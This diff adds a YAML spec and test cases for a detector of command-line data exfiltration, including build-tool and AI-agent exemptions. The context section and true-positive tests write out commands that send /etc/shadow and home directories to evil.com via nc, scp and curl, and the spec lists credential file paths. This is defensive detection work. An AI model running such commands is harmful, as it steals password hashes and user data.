@@ -1,0 +1,278 @@
+kind: detector
+name: data_exfil_cmd
+version: 1
+description: "Detects command-line data exfiltration via pipe patterns and read-then-connect correlation"
+
+context: |
+  This detector has two modes:
+  1. **Correlation mode**: Same as data_exfil_ebpf but keyed on "path" field
+     (not "filename"). Tracks sensitive file reads then checks for outbound
+     connections from the same PID within the window. Uses field "path" in
+     event details instead of "filename" (the data_exfiltration detector
+     predates the eBPF detector and uses a slightly different event schema).
+  2. **Command pattern mode**: Detects shell.command_exec events containing
+     pipe patterns that send sensitive files to network tools. Examples:
+     "cat /etc/shadow | nc evil.com 4444", "scp /etc/shadow user@evil.com:/tmp/",
+     "tar czf - /home | curl -X POST http://evil.com/upload -d @-".
+
+  Key decisions:
+  - Severity is High (not Critical) because command-based detection has more
+    room for false positives than eBPF correlation.
+  - Build tools and package managers are aggressively filtered because their
+    argv strings contain system paths that look like exfil patterns. The linker
+    (ld, collect2, lto-wrapper) references /etc/passwd in symbol resolution.
+    Cargo/gcc/make spawn subprocesses whose commands contain sensitive path
+    references. Shell wrappers (bash -c "cargo build ...") are also filtered.
+  - EXFIL_COMMAND_PATTERNS requires BOTH a source tool AND a network tool in
+    the same command. "cat /etc/shadow" alone is not exfil. "cat + nc + sensitive
+    path" is. Exception: tar + network tool is always suspicious, scp + sensitive
+    pattern already contains the sensitive reference.
+  - Sensitive path detection uses three layers: exact paths (/etc/shadow,
+    /etc/passwd), suffix patterns (.ssh/id_rsa, .aws/credentials, .env),
+    and extensions (.sql, .dump, .bak for database dumps).
+
+behavior:
+  does:
+    - "Detects file.read_access on sensitive paths followed by network.outbound_connect or network.connection from same PID within window"
+    - "Detects shell.command_exec with pipe patterns (cat+nc, tar+curl, scp+shadow, etc.) referencing sensitive files"
+    - "Detects database dump exfiltration (.sql, .dump, .bak files)"
+    - "Fires at High severity for both correlation and command pattern modes"
+  does_not:
+    - "Alert on build tools (cargo, rustc, gcc, g++, ld, collect2, cc1, cmake, make, etc.) because linker argv references system paths"
+    - "Alert on package managers (dpkg, apt, npm, pip, go) because post-install scripts reference sensitive paths"
+    - "Alert on sshd, openclaw, node (build-tool comms) to prevent dev workflow FPs"
+    - "Alert on shell wrappers around build commands (bash -c 'cargo build ...', 'make ...', 'git pull ...')"
+    - "Alert on normal curl/cat commands that do not reference sensitive files"
+    - "Alert twice for the same comm+PID or comm+file+IP within cooldown"
+
+config:
+  correlation_window_secs: 60
+  cooldown_secs: 300
+
+dependencies:
+  - "Inline SENSITIVE_PATHS, SENSITIVE_SUFFIXES, SENSITIVE_EXTENSIONS lists"
+  - "Inline EXFIL_COMMAND_PATTERNS list (source_tool, network_tool pairs)"
+  - "Inline build_tools list for command-mode filtering"
+
+test_cases:
+  true_positives:
+    - description: "Python reads /etc/shadow then connects externally"
+      input:
+        kind: "file.read_access"
+        comm: "python3"
+        pid: 1234
+        uid: 1000
+        path: "/etc/shadow"
+      followup:
+        kind: "network.outbound_connect"
+        comm: "python3"
+        pid: 1234
+        uid: 1000
+        dst_ip: "203.0.113.5"
+        dst_port: 4444
+        delay_secs: 5
+      expected:
+        alert: true
+        severity: "high"
+
+    - description: "cat /etc/shadow piped to nc"
+      input:
+        kind: "shell.command_exec"
+        comm: "bash"
+        pid: 1234
+        uid: 1000
+        command: "cat /etc/shadow | nc evil.com 4444"
+      expected:
+        alert: true
+        severity: "high"
+
+    - description: "scp of shadow file to remote host"
+      input:
+        kind: "shell.command_exec"
+        comm: "scp"
+        pid: 1234
+        uid: 1000
+        command: "scp /etc/shadow user@evil.com:/tmp/"
+      expected:
+        alert: true
+        severity: "high"
+
+    - description: "tar piped to curl for bulk exfiltration"
+      input:
+        kind: "shell.command_exec"
+        comm: "bash"
+        pid: 1234
+        uid: 1000
+        command: "tar czf - /home/user | curl -X POST http://evil.com/upload -d @-"
+      expected:
+        alert: true
+        severity: "high"
+
+    - description: "Database dump file read then exfiltrated"
+      input:
+        kind: "file.read_access"
+        comm: "python3"
+        pid: 4000
+        uid: 1000
+        path: "/tmp/backup.sql"
+      followup:
+        kind: "network.outbound_connect"
+        comm: "python3"
+        pid: 4000
+        uid: 1000
+        dst_ip: "198.51.100.2"
+        dst_port: 8080
+        delay_secs: 3
+      expected:
+        alert: true
+        severity: "high"
+
+  true_negatives:
+    - description: "Normal curl to example.com (no sensitive file reference)"
+      input:
+        kind: "shell.command_exec"
+        comm: "curl"
+        pid: 1234
+        uid: 1000
+        command: "curl http://example.com"
+      expected:
+        alert: false
+        reason: "No sensitive file reference in command"
+
+    - description: "cat of non-sensitive file"
+      input:
+        kind: "shell.command_exec"
+        comm: "cat"
+        pid: 1235
+        uid: 1000
+        command: "cat /var/log/syslog"
+      expected:
+        alert: false
+        reason: "/var/log/syslog is not a sensitive file"
+
+    - description: "Build tool (collect2) argv with system paths"
+      input:
+        kind: "shell.command_exec"
+        comm: "collect2"
+        pid: 2000
+        uid: 1000
+        command: "collect2 -plugin /usr/lib/gcc/... -o binary"
+      expected:
+        alert: false
+        reason: "collect2 is a build tool - filtered by build_tools list"
+
+    - description: "Cargo build shell wrapper"
+      input:
+        kind: "shell.command_exec"
+        comm: "bash"
+        pid: 3000
+        uid: 1000
+        command: "bash -c 'cd /home/user/project && cargo build --release'"
+      expected:
+        alert: false
+        reason: "Shell wrapper around cargo build is filtered"
+
+    - description: "Read of non-sensitive file /etc/hostname"
+      input:
+        kind: "file.read_access"
+        comm: "cat"
+        pid: 1235
+        uid: 1000
+        path: "/etc/hostname"
+      expected:
+        alert: false
+        reason: "/etc/hostname is not in sensitive file lists"
+
+    - description: "Connection after correlation window expires"
+      input:
+        kind: "file.read_access"
+        comm: "python3"
+        pid: 1234
+        uid: 1000
+        path: "/etc/shadow"
+      followup:
+        kind: "network.outbound_connect"
+        comm: "python3"
+        pid: 1234
+        uid: 1000
+        dst_ip: "203.0.113.5"
+        dst_port: 4444
+        delay_secs: 61
+      expected:
+        alert: false
+        reason: "61s exceeds 60s correlation window"
+
+    - description: "Different PID reads vs connects"
+      input:
+        kind: "file.read_access"
+        comm: "python3"
+        pid: 1234
+        uid: 1000
+        path: "/etc/shadow"
+      followup:
+        kind: "network.outbound_connect"
+        comm: "curl"
+        pid: 5678
+        uid: 1000
+        dst_ip: "203.0.113.5"
+        dst_port: 4444
+        delay_secs: 5
+      expected:
+        alert: false
+        reason: "Different PIDs - no same-PID correlation"
+
+  false_positive_fixes:
+    - date: "2026-04-02"
+      description: "Linker collect2/ld referencing system paths in argv"
+      context: |
+        During cargo build, the GNU linker (collect2, ld, lto-wrapper) spawns
+        with command lines that reference system library paths containing
+        patterns like "/etc/passwd" or "shadow" in library names. These are
+        compiler/linker artifacts, not exfiltration. Fixed by adding the full
+        build toolchain (collect2, ld, cc, cc1, cc1plus, as, lto-wrapper,
+        cargo, rustc, gcc, g++, clang, make, cmake, ninja) to build_tools.
+      input:
+        kind: "shell.command_exec"
+        comm: "collect2"
+        pid: 2000
+        uid: 1000
+        command: "collect2 -plugin /usr/lib/gcc/x86_64-linux-gnu/..."
+      expected:
+        alert: false
+
+    - date: "2026-04-02"
+      description: "Shell wrappers around build commands (bash -c 'cargo build')"
+      context: |
+        When bash or sh wraps a build command (e.g., "bash -c 'cd /project && cargo build'"),
+        the command string may contain references to sensitive paths in build
+        artifacts. Since comm=bash but the actual intent is a build, we filter
+        long commands (>100 chars) that contain known build substrings:
+        "cargo build", "cargo test", "make ", "cmake ", "git pull", "git push".
+      input:
+        kind: "shell.command_exec"
+        comm: "bash"
+        pid: 3000
+        uid: 1000
+        command: "bash -c 'cd /home/user/project && cargo build --release && cargo test'"
+      expected:
+        alert: false
+
+    - date: "2026-04-02"
+      description: "OpenClaw AI agent and sshd in build_tools list"
+      context: |
+        OpenClaw (Node.js AI agent) and sshd were added to the build_tools
+        filter for command-mode detection. OpenClaw spawns subprocesses with
+        command strings that reference environment files. sshd's ForceCommand
+        directives can contain path references. Both are false positives in
+        command-pattern matching.
+      input:
+        kind: "shell.command_exec"
+        comm: "openclaw"
+        pid: 5000
+        uid: 1000
+        command: "node /app/openclaw/index.js --env /app/.env"
+      expected:
+        alert: false
+
+history:
+  - "2026-04-02: initial spec from production FP analysis"
